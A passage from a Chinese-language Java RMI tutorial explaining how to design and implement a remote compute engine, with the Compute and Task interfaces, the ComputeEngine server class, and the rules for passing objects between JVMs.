\u8fdc\u7a0b\u5bf9\u8c61\u6ce8\u518c\u8868\u3001\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u3002 \u672c\u8282\u7684\u5176\u4f59\u90e8\u5206\u5c06\u4ecb\u7ecd\u7528\u4e8e\u521b\u5efa\u8ba1\u7b97\u5f15\u64ce\u7684\u6b65\u9aa4\u3002 3.5. \u6784\u5efa\u4e00\u4e2a\u901a\u7528\u7684\u8ba1\u7b97\u5f15\u64ce # \u4e0b\u9762\u7684\u5185\u5bb9\u4e3b\u8981\u4ecb\u7ecd\u4e00\u4e2a\u7b80\u5355\u4f46\u529f\u80fd\u5f3a\u5927\u7684\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\uff0c\u5373\u8ba1\u7b97\u5f15\u64ce\u3002\u8ba1\u7b97\u5f15\u64ce\u662f\u670d\u52a1\u5668\u4e0a\u7684\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u5b83\u4ece\u5ba2\u6237\u7aef\u83b7\u53d6\u4efb\u52a1\uff0c\u8fd0\u884c\u4efb\u52a1\u5e76\u8fd4\u56de\u4efb\u4f55\u7ed3\u679c\u3002\u4efb\u52a1\u5728\u670d\u52a1\u5668\u8fd0\u884c\u7684\u673a\u5668\u4e0a\u8fd0\u884c\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u8bb8\u591a\u5ba2\u6237\u7aef\u673a\u5668\u80fd\u591f\u4f7f\u7528\u7279\u522b\u5f3a\u5927\u7684\u673a\u5668\u6216\u5177\u6709\u4e13\u95e8\u786c\u4ef6\u7684\u673a\u5668\u3002 \u8ba1\u7b97\u5f15\u64ce\u7684\u65b0\u9896\u4e4b\u5904\u5728\u4e8e\uff0c\u5728\u7f16\u5199\u6216\u542f\u52a8\u8ba1\u7b97\u5f15\u64ce\u65f6\uff0c\u4e0d\u9700\u8981\u5b9a\u4e49\u5b83\u8fd0\u884c\u7684\u4efb\u52a1\u3002\u53ef\u4ee5\u5728\u4efb\u4f55\u65f6\u5019\u521b\u5efa\u65b0\u7c7b\u578b\u7684\u4efb\u52a1\uff0c\u7136\u540e\u5c06\u5176\u4ea4\u7ed9\u8981\u8fd0\u884c\u7684\u8ba1\u7b97\u5f15\u64ce\u3002\u4efb\u52a1\u7684\u60df\u4e00\u8981\u6c42\u662f\u5176\u7c7b\u5b9e\u73b0\u7279\u5b9a\u7684\u63a5\u53e3\u3002\u5b8c\u6210\u4efb\u52a1\u6240\u9700\u7684\u4ee3\u7801\u53ef\u4ee5\u7531RMI\u7cfb\u7edf\u4e0b\u8f7d\u5230\u8ba1\u7b97\u5f15\u64ce\u3002\u7136\u540e\uff0c\u8ba1\u7b97\u5f15\u64ce\u8fd0\u884c\u4efb\u52a1\uff0c\u4f7f\u7528\u6b63\u5728\u8fd0\u884c\u8ba1\u7b97\u5f15\u64ce\u7684\u673a\u5668\u4e0a\u7684\u8d44\u6e90\u3002 \u6267\u884c\u4efb\u610f\u4efb\u52a1\u7684\u80fd\u529b\u662f\u7531 Java \u5e73\u53f0\u7684\u52a8\u6001\u7279\u6027\u6240\u652f\u6301\u7684\uff0c\u5b83\u901a\u8fc7RMI\u6269\u5c55\u5230\u7f51\u7edc\u3002 RMI \u52a8\u6001\u5730\u5c06\u4efb\u52a1\u4ee3\u7801\u52a0\u8f7d\u5230\u8ba1\u7b97\u5f15\u64ce\u7684 Java \u865a\u62df\u673a\u4e2d\uff0c\u5e76\u5728\u4e0d\u77e5\u9053\u5b9e\u73b0\u4efb\u52a1\u7684\u7c7b\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u4efb\u52a1\u3002\u8fd9\u79cd\u80fd\u591f\u52a8\u6001\u4e0b\u8f7d\u4ee3\u7801\u7684\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u88ab\u79f0\u4e3a\u57fa\u4e8e\u884c\u4e3a\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u6b64\u7c7b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u9700\u8981\u5b8c\u6574\u7684\u542f\u7528\u4ee3\u7406\u7684\u57fa\u7840\u8bbe\u65bd\u3002\u5bf9\u4e8eRMI\uff0c\u8fd9\u6837\u7684\u5e94\u7528\u7a0b\u5e8f\u662f Java \u5e73\u53f0\u4e0a\u5206\u5e03\u5f0f\u8ba1\u7b97\u7684\u57fa\u672c\u673a\u5236\u7684\u4e00\u90e8\u5206\u3002 4. \u5982\u4f55\u5b9e\u73b0\u4e00\u4e2a RMI \u670d\u52a1\u5668 # \u670d\u52a1\u5668\u4ece\u5ba2\u6237\u7aef\u63a5\u6536\u4efb\u52a1\uff0c\u8fd0\u884c\u4efb\u52a1\u5e76\u8fd4\u56de\u4efb\u4f55\u7ed3\u679c\u3002\u670d\u52a1\u5668\u4ee3\u7801\u7531\u63a5\u53e3\u548c\u7c7b\u7ec4\u6210\u3002\u63a5\u53e3\u5b9a\u4e49\u4e86\u53ef\u4ee5\u4ece\u5ba2\u6237\u7aef\u8c03\u7528\u7684\u65b9\u6cd5\u3002\u672c\u8d28\u4e0a\uff0c\u63a5\u53e3\u5b9a\u4e49\u4e86\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5ba2\u6237\u7aef\u89c6\u56fe\u3002\u7c7b\u5b9a\u4e49\u4e86\u65b9\u6cd5\u7684\u5b9e\u73b0\u7ec6\u8282\u3002 \u8fd9\u4e00\u7ae0\u4e3b\u8981\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206 Designing a Remote Interface \u7b2c\u4e00\u90e8\u5206\u5b9a\u4e49\u4e86 Compute \u63a5\u53e3\uff0c\u5b83\u63d0\u4f9b\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u8fde\u63a5\u3002\u901a\u8fc7\u8fd9\u4e00\u8282\u5185\u5bb9\uff0c\u4f60\u8fd8\u5c06\u4e86\u89e3\u652f\u6301\u8fd9\u79cd\u901a\u4fe1\u7684 RMI API \u3002 Implementing a Remote Interface \u7b2c\u4e8c\u90e8\u5206\u5c06\u8ba8\u8bba\u5982\u4f55\u5b9e\u73b0 Compute \u63a5\u53e3\u7684\u7c7b\uff0c\u4ece\u800c\u5b9e\u73b0\u8fdc\u7a0b\u5bf9\u8c61\u3002\u8be5\u7c7b\u8fd8\u63d0\u4f9b\u7ec4\u6210\u670d\u52a1\u5668\u7a0b\u5e8f\u7684\u5176\u4f59\u4ee3\u7801\uff0c\u5305\u62ec\u521b\u5efa\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u4f8b\u3001\u5411RMI\u6ce8\u518c\u8868\u6ce8\u518c\u8be5\u5bf9\u8c61\u5e76\u8bbe\u7f6e\u5b89\u5168\u7ba1\u7406\u5668\u7684 main \u65b9\u6cd5\u3002 4.1. \u8bbe\u8ba1\u8fdc\u7a0b\u63a5\u53e3 # \u8ba1\u7b97\u5f15\u64ce\u7684\u6838\u5fc3\u662f\u534f\u8bae\uff0c\u8be5\u534f\u8bae\u4f7f\u4efb\u52a1\u53ef\u4ee5\u63d0\u4ea4\u5230\u8ba1\u7b97\u5f15\u64ce\uff0c\u8ba1\u7b97\u5f15\u64ce\u53ef\u4ee5\u8fd0\u884c\u8fd9\u4e9b\u4efb\u52a1\uff0c\u5e76\u5c06\u8fd9\u4e9b\u4efb\u52a1\u7684\u7ed3\u679c\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002\u8be5\u534f\u8bae\u5728\u8ba1\u7b97\u5f15\u64ce\u652f\u6301\u7684\u63a5\u53e3\u4e2d\u8868\u793a\u3002 \u4e0b\u56fe\u8bf4\u660e\u4e86\u6b64\u534f\u8bae\u7684\u8fdc\u7a0b\u901a\u4fe1\u3002 \\text{Figure 4. \u8fdc\u7a0b\u901a\u4fe1} \u6bcf\u4e2a\u63a5\u53e3\u90fd\u5305\u542b\u4e00\u4e2a\u65b9\u6cd5\u3002 \u8ba1\u7b97\u5f15\u64ce\u7684\u8fdc\u7a0b\u63a5\u53e3 Compute \u4f7f\u4efb\u52a1\u53ef\u4ee5\u63d0\u4ea4\u5230\u5f15\u64ce\u3002 \u5ba2\u6237\u7aef\u63a5\u53e3 Task \u5b9a\u4e49\u4e86\u8ba1\u7b97\u5f15\u64ce\u5982\u4f55\u6267\u884c\u63d0\u4ea4\u7684\u4efb\u52a1\u3002 compute.Compute \u63a5\u53e3\u5b9a\u4e49\u4e86\u53ef\u8fdc\u7a0b\u8bbf\u95ee\u7684\u90e8\u5206\uff0c\u5373\u8ba1\u7b97\u5f15\u64ce\u672c\u8eab\u3002 \u8fd9\u662f Compute \u63a5\u53e3\u7684\u6e90\u4ee3\u7801\uff1a package compute; import java.rmi.Remote; import java.rmi.RemoteException; public interface Compute extends Remote { <T> T executeTask(Task<T> t) throws RemoteException; } \u901a\u8fc7\u6269\u5c55\u63a5\u53e3 java.rmi.Remote \uff0c Compute \u63a5\u53e3\u5c06\u5176\u81ea\u8eab\u6807\u8bc6\u4e3a\u53ef\u4ee5\u4ece\u53e6\u4e00\u4e2a Java \u865a\u62df\u673a\u8c03\u7528\u5176\u65b9\u6cd5\u7684\u63a5\u53e3\u3002 \u5b9e\u73b0\u6b64\u63a5\u53e3\u7684\u4efb\u4f55\u5bf9\u8c61\u90fd\u53ef\u4ee5\u662f\u8fdc\u7a0b\u5bf9\u8c61\u3002 \u4f5c\u4e3a\u8fdc\u7a0b\u63a5\u53e3\u7684\u6210\u5458\uff0c executeTask \u65b9\u6cd5\u662f\u4e00\u79cd\u8fdc\u7a0b\u65b9\u6cd5\u3002 \u56e0\u6b64\uff0c\u5fc5\u987b\u5c06\u6b64\u65b9\u6cd5\u5b9a\u4e49\u4e3a\u80fd\u591f\u629b\u51fa java.rmi.RemoteException \u3002 RMI \u7cfb\u7edf\u4ece\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\u4e2d\u629b\u51fa\u6b64\u5f02\u5e38\uff0c\u4ee5\u8868\u660e\u53d1\u751f\u901a\u4fe1\u6545\u969c\u6216\u534f\u8bae\u9519\u8bef\u3002 RemoteException \u662f\u4e00\u4e2a\u8981\u6c42\u88ab\u6355\u83b7\u7684\u5f02\u5e38\uff0c\u56e0\u6b64\u4efb\u4f55\u8c03\u7528\u8fdc\u7a0b\u65b9\u6cd5\u7684\u4ee3\u7801\u90fd\u9700\u8981\u901a\u8fc7\u6355\u83b7\u8be5\u5f02\u5e38\u6216\u5728\u5176 throws \u5b50\u53e5\u4e2d\u58f0\u660e\u8be5\u5f02\u5e38\u6765\u5bf9\u5176\u8fdb\u884c\u5904\u7406\u3002 \u8ba1\u7b97\u5f15\u64ce\u6240\u9700\u7684\u7b2c\u4e8c\u4e2a\u63a5\u53e3\u662f Task \u63a5\u53e3\uff0c\u5b83\u662f Compute \u63a5\u53e3\u4e2d executeTask \u65b9\u6cd5\u7684\u53c2\u6570\u7c7b\u578b\u3002 compute.Task \u63a5\u53e3\u5b9a\u4e49\u4e86\u8ba1\u7b97\u5f15\u64ce\u4e0e\u5176\u9700\u8981\u5b8c\u6210\u7684\u5de5\u4f5c\u4e4b\u95f4\u7684\u63a5\u53e3\uff0c\u4ece\u800c\u63d0\u4f9b\u4e86\u5f00\u59cb\u5de5\u4f5c\u7684\u65b9\u5f0f\u3002 \u8fd9\u662f Task \u754c\u9762\u7684\u6e90\u4ee3\u7801\uff1a package compute; public interface Task<T> { T execute(); } Task \u63a5\u53e3\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b9\u6cd5 execute \uff0c\u5b83\u6ca1\u6709\u53c2\u6570\uff0c\u4e5f\u4e0d\u4f1a\u5f15\u53d1\u5f02\u5e38\u3002 \u56e0\u4e3a\u8be5\u63a5\u53e3\u672a\u6269\u5c55 Remote \uff0c\u6240\u4ee5\u8be5\u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5\u4e0d\u9700\u8981\u5728\u5176 throws \u5b50\u53e5\u4e2d\u5217\u51fa java.rmi.RemoteException \u3002 Task \u63a5\u53e3\u5177\u6709\u7c7b\u578b\u53c2\u6570 T \uff0c\u5b83\u8868\u793a\u4efb\u52a1\u8ba1\u7b97\u7684\u7ed3\u679c\u7c7b\u578b\u3002 \u6b64\u63a5\u53e3\u7684 execute \u65b9\u6cd5\u8fd4\u56de\u8ba1\u7b97\u7ed3\u679c\uff0c\u56e0\u6b64\u5176\u8fd4\u56de\u7c7b\u578b\u4e3a T \u3002 \u53cd\u8fc7\u6765\uff0c Compute \u63a5\u53e3\u7684 executeTask \u65b9\u6cd5\u8fd4\u56de\u4f20\u9012\u7ed9\u5b83\u7684 Task \u5b9e\u4f8b\u7684\u6267\u884c\u7ed3\u679c\u3002 \u56e0\u6b64\uff0c executeTask \u65b9\u6cd5\u5177\u6709\u81ea\u5df1\u7684\u7c7b\u578b\u53c2\u6570 T \uff0c\u8be5\u53c2\u6570\u5c06\u5176\u81ea\u8eab\u7684\u8fd4\u56de\u7c7b\u578b\u4e0e\u4f20\u9012\u7684 Task \u5b9e\u4f8b\u7684\u7ed3\u679c\u7c7b\u578b\u76f8\u5173\u8054\u3002 RMI \u4f7f\u7528 Java \u5bf9\u8c61\u5e8f\u5217\u5316\u673a\u5236\u5728 Java \u865a\u62df\u673a\u4e4b\u95f4\u6309\u503c\u4f20\u8f93\u5bf9\u8c61\u3002 \u5bf9\u4e8e\u88ab\u89c6\u4e3a\u53ef\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\uff0c\u5176\u7c7b\u5fc5\u987b\u5b9e\u73b0 java.io.Serializable \u6807\u8bb0\u63a5\u53e3\u3002 \u56e0\u6b64\uff0c\u5b9e\u73b0 Task \u63a5\u53e3\u7684\u7c7b\u4e5f\u5fc5\u987b\u5b9e\u73b0 Serializable \uff0c\u7528\u4e8e\u4efb\u52a1\u7ed3\u679c\u7684\u5bf9\u8c61\u7684\u7c7b\u4e5f\u5fc5\u987b\u5b9e\u73b0\u3002 \u53ea\u8981\u4efb\u52a1\u7c7b\u578b\u662f Task \u7684\u5b9e\u73b0\uff0c\u5c31\u53ef\u4ee5\u7531 Compute \u5bf9\u8c61\u8fd0\u884c\u5404\u79cd\u4efb\u52a1\u3002\u5b9e\u73b0\u6b64\u63a5\u53e3\u7684\u7c7b\u53ef\u4ee5\u5305\u542b\u4efb\u52a1\u8ba1\u7b97\u6240\u9700\u7684\u4efb\u4f55\u6570\u636e\u4ee5\u53ca\u8ba1\u7b97\u6240\u9700\u7684\u4efb\u4f55\u5176\u4ed6\u65b9\u6cd5\u3002 \u8fd9\u5c31\u662f RMI \u5982\u4f55\u4f7f\u8fd9\u79cd\u7b80\u5355\u7684\u8ba1\u7b97\u5f15\u64ce\u6210\u4e3a\u53ef\u80fd\u3002\u56e0\u4e3a RMI \u53ef\u4ee5\u5047\u5b9a Task \u5bf9\u8c61\u662f\u7528 Java \u7f16\u7a0b\u8bed\u8a00\u7f16\u5199\u7684\uff0c\u6240\u4ee5 RMI \u5c06\u6839\u636e\u9700\u8981\u5c06\u8ba1\u7b97\u5f15\u64ce\u5148\u524d\u672a\u77e5\u7684 Task \u5bf9\u8c61\u7684\u5b9e\u73b0\u4e0b\u8f7d\u5230\u8ba1\u7b97\u5f15\u64ce\u7684 Java \u865a\u62df\u673a\u4e2d\u3002\u6b64\u529f\u80fd\u4f7f\u8ba1\u7b97\u5f15\u64ce\u7684\u5ba2\u6237\u7aef\u53ef\u4ee5\u5b9a\u4e49\u8981\u5728\u670d\u52a1\u5668\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884c\u7684\u65b0\u4efb\u52a1\uff0c\u800c\u65e0\u9700\u5728\u8be5\u8ba1\u7b97\u673a\u4e0a\u663e\u5f0f\u5b89\u88c5\u4ee3\u7801\u3002 \u7531 ComputeEngine \u7c7b\u5b9e\u73b0\u7684\u8ba1\u7b97\u5f15\u64ce\u5b9e\u73b0 Compute \u63a5\u53e3\uff0c\u4ece\u800c\u5141\u8bb8\u901a\u8fc7\u8c03\u7528\u5176 executeTask \u65b9\u6cd5\u5c06\u4e0d\u540c\u7684\u4efb\u52a1\u63d0\u4ea4\u7ed9\u5b83\u3002\u4f7f\u7528\u4efb\u52a1\u7684 execute \u65b9\u6cd5\u5b9e\u73b0\u8fd0\u884c\u8fd9\u4e9b\u4efb\u52a1\uff0c\u5e76\u5c06\u7ed3\u679c\u8fd4\u56de\u5230\u8fdc\u7a0b\u5ba2\u6237\u7aef\u3002 4.2. \u5b9e\u73b0\u8fdc\u7a0b\u63a5\u53e3 # \u672c\u8282\u8ba8\u8bba\u4e3a\u8ba1\u7b97\u5f15\u64ce\u5b9e\u73b0\u7c7b\u7684\u4efb\u52a1\u3002 \u901a\u5e38\uff0c\u5b9e\u73b0\u8fdc\u7a0b\u63a5\u53e3\u7684\u7c7b\u81f3\u5c11\u5e94\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a \u58f0\u660e\u8981\u88ab\u5b9e\u73b0\u7684\u8fdc\u7a0b\u63a5\u53e3 \u4e3a\u6bcf\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u5b9a\u4e49\u6784\u9020\u51fd\u6570 \u63d0\u4f9b\u8fdc\u7a0b\u63a5\u53e3\u4e2d\u6bcf\u4e2a\u8fdc\u7a0b\u65b9\u6cd5\u7684\u5b9e\u73b0 RMI \u670d\u52a1\u5668\u7a0b\u5e8f\u9700\u8981\u521b\u5efa\u521d\u59cb\u7684\u8fdc\u7a0b\u5bf9\u8c61\u5e76\u5c06\u5176\u5bfc\u51fa\u5230 RMI \u8fd0\u884c\u65f6\uff0c\u8fd9\u4f7f\u5b83\u4eec\u53ef\u7528\u4e8e\u63a5\u6536\u4f20\u5165\u7684\u8fdc\u7a0b\u8c03\u7528\u3002 \u6b64\u8bbe\u7f6e\u8fc7\u7a0b\u53ef\u4ee5\u5c01\u88c5\u5728\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u73b0\u7c7b\u672c\u8eab\u7684\u65b9\u6cd5\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u5b8c\u5168\u5305\u542b\u5728\u53e6\u4e00\u4e2a\u7c7b\u4e2d\u3002 \u8bbe\u7f6e\u8fc7\u7a0b\u5e94\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a \u521b\u5efa\u5e76\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668 \u521b\u5efa\u548c\u5bfc\u51fa\u4e00\u4e2a\u6216\u591a\u4e2a\u8fdc\u7a0b\u5bf9\u8c61 \u4e3a\u4e86\u5f15\u5bfc\u76ee\u7684\uff0c\u81f3\u5c11\u5411 RMI \u6ce8\u518c\u8868\uff08\u6216\u5411\u53e6\u4e00\u4e2a\u547d\u540d\u670d\u52a1\uff0c\u4f8b\u5982\u53ef\u901a\u8fc7 Java \u547d\u540d\u548c\u76ee\u5f55\u63a5\u53e3\u8bbf\u95ee\u7684\u670d\u52a1\uff09\u6ce8\u518c\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u3002 \u63a5\u4e0b\u6765\u662f\u8ba1\u7b97\u5f15\u64ce\u7684\u5b8c\u6574\u5b9e\u73b0\u3002 engine.ComputeEngine \u7c7b\u5b9e\u73b0\u8fdc\u7a0b\u63a5\u53e3 Compute \uff0c\u5e76\u4e14\u8fd8\u5305\u62ec\u7528\u4e8e\u8bbe\u7f6e\u8ba1\u7b97\u5f15\u64ce\u7684\u4e3b\u8981\u65b9\u6cd5\u3002 \u8fd9\u662f ComputeEngine \u7c7b\u7684\u6e90\u4ee3\u7801\uff1a package engine; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.UnicastRemoteObject; import compute.Compute; import compute.Task; public class ComputeEngine implements Compute { public ComputeEngine() { super(); } public <T> T executeTask(Task<T> t) { return t.execute(); } public static void main(String[] args) { if (System.getSecurityManager() == null) { System.setSecurityManager(new SecurityManager()); } try { String name = \"Compute\"; Compute engine = new ComputeEngine(); Compute stub = (Compute) UnicastRemoteObject.exportObject(engine, 0); Registry registry = LocateRegistry.getRegistry(); registry.rebind(name, stub); System.out.println(\"ComputeEngine bound\"); } catch (Exception e) { System.err.println(\"ComputeEngine exception:\"); e.printStackTrace(); } } } \u4ee5\u4e0b\u5404\u8282\u8ba8\u8bba\u8ba1\u7b97\u5f15\u64ce\u5b9e\u73b0\u7684\u6bcf\u4e2a\u7ec4\u4ef6\u3002 4.2.1. \u58f0\u660e\u6b63\u5728\u5b9e\u73b0\u7684\u8fdc\u7a0b\u63a5\u53e3 # \u8ba1\u7b97\u5f15\u64ce\u7684\u5b9e\u73b0\u7c7b\u58f0\u660e\u5982\u4e0b\uff1a public class ComputeEngine implements Compute \u8be5\u58f0\u660e\u6307\u51fa\u8be5\u7c7b\u5b9e\u73b0\u4e86 Compute \u8fdc\u7a0b\u63a5\u53e3\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4e8e\u8fdc\u7a0b\u5bf9\u8c61\u3002 ComputeEngine \u7c7b\u5b9a\u4e49\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u73b0\u7c7b\uff0c\u8be5\u7c7b\u5b9e\u73b0\u5355\u4e2a\u8fdc\u7a0b\u63a5\u53e3\u800c\u6ca1\u6709\u5176\u4ed6\u63a5\u53e3\u3002 ComputeEngine \u7c7b\u8fd8\u5305\u542b\u4e24\u4e2a\u53ea\u80fd\u5728\u672c\u5730\u8c03\u7528\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u5143\u7d20\u3002 \u8fd9\u4e9b\u5143\u7d20\u4e2d\u7684\u7b2c\u4e00\u4e2a\u662f ComputeEngine \u5b9e\u4f8b\u7684\u6784\u9020\u51fd\u6570\u3002 \u8fd9\u4e9b\u5143\u7d20\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u662f\u7528\u4e8e\u521b\u5efa ComputeEngine \u5b9e\u4f8b\u5e76\u5c06\u5176\u63d0\u4f9b\u7ed9\u5ba2\u6237\u7aef\u7684 main \u65b9\u6cd5\u3002 4.2.2. \u5b9a\u4e49\u8fdc\u7a0b\u5bf9\u8c61\u7684\u6784\u9020\u65b9\u6cd5 # ComputeEngine \u7c7b\u5177\u6709\u4e00\u4e2a\u4e0d\u5e26\u4efb\u4f55\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\u3002 \u6784\u9020\u51fd\u6570\u7684\u4ee3\u7801\u5982\u4e0b\uff1a public ComputeEngine() { super(); } \u8be5\u6784\u9020\u51fd\u6570\u4ec5\u8c03\u7528\u8d85\u7c7b\u6784\u9020\u51fd\u6570\uff0c\u5b83\u662f Object \u7c7b\u7684\u65e0\u53c2\u6570\u6784\u9020\u51fd\u6570\u3002 \u5c3d\u7ba1\u8fd9\u91cc\u53ef\u4ee5\u7701\u7565\uff0c\u4f46\u4e3a\u4e86\u63cf\u8ff0\u6e05\u695a\u8fd8\u662f\u5c06\u5176\u5305\u62ec\u5728\u5185\u3002 4.2.3. \u63d0\u4f9b\u6bcf\u79cd\u8fdc\u7a0b\u65b9\u6cd5\u7684\u5b9e\u73b0 # \u8fdc\u7a0b\u5bf9\u8c61\u7684\u7c7b\u4e3a\u8fdc\u7a0b\u63a5\u53e3\u4e2d\u6307\u5b9a\u7684\u6bcf\u4e2a\u8fdc\u7a0b\u65b9\u6cd5\u63d0\u4f9b\u5b9e\u73b0\u3002 Compute\u63a5\u53e3\u5305\u542b\u4e00\u4e2a\u8fdc\u7a0b\u65b9\u6cd5executeTask\uff0c\u8be5\u65b9\u6cd5\u5982\u4e0b\u5b9e\u73b0\uff1a public <T> T executeTask(Task<T> t) { return t.execute(); } \u6b64\u65b9\u6cd5\u5b9e\u73b0 ComputeEngine \u8fdc\u7a0b\u5bf9\u8c61\u4e0e\u5176\u5ba2\u6237\u7aef\u4e4b\u95f4\u7684\u534f\u8bae\u3002 \u6bcf\u4e2a\u5ba2\u6237\u7aef\u5411 ComputeEngine \u63d0\u4f9b\u4e00\u4e2a Task \u5bf9\u8c61\uff0c\u8be5 Task \u5bf9\u8c61\u5177\u6709 Task \u63a5\u53e3\u7684 execute \u65b9\u6cd5\u7684\u7279\u5b9a\u5b9e\u73b0\u3002 ComputeEngine \u6267\u884c\u6bcf\u4e2a\u5ba2\u6237\u7aef\u7684\u4efb\u52a1\uff0c\u5e76\u5c06\u4efb\u52a1\u7684 execute \u65b9\u6cd5\u7684\u7ed3\u679c\u76f4\u63a5\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002 4.2.4. \u5728RMI\u4e2d\u4f20\u9012\u5bf9\u8c61 # \u8fdc\u7a0b\u65b9\u6cd5\u7684\u53c2\u6570\u6216\u4ece\u8fdc\u7a0b\u65b9\u6cd5\u8fd4\u56de\u7684\u503c\u51e0\u4e4e\u53ef\u4ee5\u662f\u4efb\u4f55\u7c7b\u578b\uff0c\u5305\u62ec\u672c\u5730\u5bf9\u8c61\uff0c\u8fdc\u7a0b\u5bf9\u8c61\u548c\u539f\u59cb\u6570\u636e\u7c7b\u578b\u3002\u66f4\u51c6\u786e\u5730\u8bf4\uff0c\u4efb\u4f55\u7c7b\u578b\u7684\u4efb\u4f55\u5b9e\u4f53\u90fd\u53ef\u4ee5\u4f20\u5165\u6216\u4f20\u51fa\u8fdc\u7a0b\u65b9\u6cd5\uff0c\u53ea\u8981\u8be5\u5b9e\u4f53\u662f\u4f5c\u4e3a\u539f\u59cb\u6570\u636e\u7c7b\u578b\uff0c\u8fdc\u7a0b\u5bf9\u8c61\u6216\u53ef\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u7c7b\u578b\u7684\u5b9e\u4f8b\u5373\u53ef\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u5b9e\u73b0\u4e86\u63a5\u53e3 java.io.Serializable \u3002 \u67d0\u4e9b\u5bf9\u8c61\u7c7b\u578b\u4e0d\u6ee1\u8db3\u4efb\u4f55\u8fd9\u4e9b\u6761\u4ef6\uff0c\u56e0\u6b64\u65e0\u6cd5\u4f20\u9012\u7ed9\u8fdc\u7a0b\u65b9\u6cd5\u6216\u4ece\u8fdc\u7a0b\u65b9\u6cd5\u8fd4\u56de\u3002 \u8fd9\u4e9b\u5bf9\u8c61\u4e2d\u7684\u5927\u591a\u6570\uff08\u4f8b\u5982\u7ebf\u7a0b\u6216\u6587\u4ef6\u63cf\u8ff0\u7b26\uff09\u90fd\u5c01\u88c5\u4e86\u4ec5\u5728\u5355\u4e2a\u5730\u5740\u7a7a\u95f4\u5185\u6709\u610f\u4e49\u7684\u4fe1\u606f\u3002 \u8bb8\u591a\u6838\u5fc3\u7c7b\uff08\u5305\u62ec\u8f6f\u4ef6\u5305 java.lang \u548c java.util \u4e2d\u7684\u7c7b\uff09\u90fd\u5b9e\u73b0\u4e86 Serializable \u63a5\u53e3\u3002 \u63a7\u5236\u5982\u4f55\u4f20\u9012\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u89c4\u5219\u5982\u4e0b\uff1a \u8fdc\u7a0b\u5bf9\u8c61\u672c\u8d28\u4e0a\u662f\u901a\u8fc7\u5f15\u7528\u4f20\u9012\u7684 \u3002 \u8fdc\u7a0b\u5bf9\u8c61\u5f15\u7528\u662f\u4e00\u4e2a\u5b58\u6839\uff0c\u5b83\u662f\u4e00\u4e2a\u5ba2\u6237\u7aef\u4ee3\u7406\uff0c\u53ef\u5b9e\u73b0\u8be5\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u73b0\u7684\u5b8c\u6574\u7684\u8fdc\u7a0b\u63a5\u53e3\u96c6\u3002 \u4f7f\u7528\u5bf9\u8c61\u5e8f\u5217\u5316\uff0c\u672c\u5730\u5bf9\u8c61\u901a\u8fc7\u526f\u672c\u4f20\u9012 \u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5c06\u590d\u5236\u6240\u6709\u5b57\u6bb5\uff0c\u4f46\u6807\u8bb0\u4e3a\u9759\u6001\u6216\u77ac\u6001\u7684\u5b57\u6bb5\u9664\u5916\u3002 \u53ef\u4ee5\u9010\u7ea7\u8986\u76d6\u9ed8\u8ba4\u5e8f\u5217\u5316\u884c\u4e3a\u3002 \u901a\u8fc7\u5f15\u7528\u4f20\u9012\u8fdc\u7a0b\u5bf9\u8c61\u610f\u5473\u7740\uff0c\u901a\u8fc7\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\u5bf9\u5bf9\u8c61\u72b6\u6001\u6240\u505a\u7684\u4efb\u4f55\u66f4\u6539\uff0c\u90fd\u5c06\u53cd\u6620\u5728\u539f\u59cb\u8fdc\u7a0b\u5bf9\u8c61\u4e2d\u3002\u4f20\u9012\u8fdc\u7a0b\u5bf9\u8c61\u65f6\uff0c\u53ea\u6709\u4f5c\u4e3a\u8fdc\u7a0b\u63a5\u53e3\u7684\u90a3\u4e9b\u63a5\u53e3\u53ef\u7528\u4e8e\u63a5\u6536\u5668\u3002\u5728\u5b9e\u73b0\u7c7b\u4e2d\u5b9a\u4e49\u7684\u65b9\u6cd5\u6216\u5728\u7531\u8be5\u7c7b\u5b9e\u73b0\u7684\u975e\u8fdc\u7a0b\u63a5\u53e3\u4e2d\u5b9a\u4e49\u7684\u4efb\u4f55\u65b9\u6cd5\u5747\u4e0d\u9002\u7528\u4e8e\u8be5\u63a5\u6536\u8005\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u8981\u5c06\u5f15\u7528\u4f20\u9012\u7ed9 ComputeEngine 